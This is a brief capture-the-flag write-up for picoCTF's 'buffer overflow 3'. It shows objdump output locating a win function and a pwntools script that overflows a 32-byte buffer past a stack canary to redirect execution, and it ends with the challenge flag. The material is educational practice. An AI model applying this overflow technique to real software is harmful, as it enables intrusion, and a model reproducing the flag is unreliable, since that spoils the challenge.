> buffer overflow 3 - Points: 450 - (Solves: 80)
> It looks like Dr. Xernon added a stack canary to this program to protect against buffer overflows. Do you think you can bypass the protection and get the flag? You can find it in /problems/buffer-overflow-3_4_931796dc4e43db0865e15fa60eb55b9e. Source.

Buffer size: 32
Canary size: 4

```
% objdump -D vuln | grep win -A 2
win:
 80486eb:       55      pushl   %ebp
  80486ec:       89 e5   movl    %esp, %ebp
  --
   804870d:       75 1a   jne     26 <win+0x3E>
    804870f:       83 ec 0c        subl    $12, %esp
     8048712:       68 9c 89 04 08  pushl   $134515100
     ```

     Win address: 0x080486eb

     Canary bruteforce program:
     <look at exploit.py file>

     Exploit program:
     ```
     from pwn import *

     p = process('./overflow-3')

     canary = 'test'
     offset = 32

     post_offset = 16

     win_add = 0x080486eb

     p.sendline(str(offset + len(canary) + post_offset + 4))
     p.sendline('A'*offset + canary + 'A' * post_offset + p32(win_add))

     print p.recvrepeat(0.2)
     ```

Flag: `picoCTF{eT_tU_bRuT3_F0Rc3_9bb35cfd}`
